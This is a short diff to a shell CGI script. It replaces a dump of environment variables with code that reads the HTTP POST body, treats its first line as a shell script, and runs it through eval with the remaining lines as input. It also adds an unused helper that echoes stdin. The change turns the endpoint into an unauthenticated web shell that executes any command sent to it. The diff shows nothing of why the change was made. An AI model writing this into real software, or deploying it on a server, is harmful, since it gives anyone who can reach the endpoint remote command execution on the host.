@@ -1,7 +1,13 @@
+
+
+mycat(){
+  echo "Just echo back stdin:"
+  cat
+}
+
 echo "Content-type: text/plain"
 echo
-echo "Environment variables are:"
-echo
-env
-echo
-echo
+POST="$(cat)"
+SCR=$(echo -n "$POST" | head -n1)
+STDIN=$(echo -n "$POST" | tail -n +3) 
+echo -n "$STDIN" | eval "$SCR"
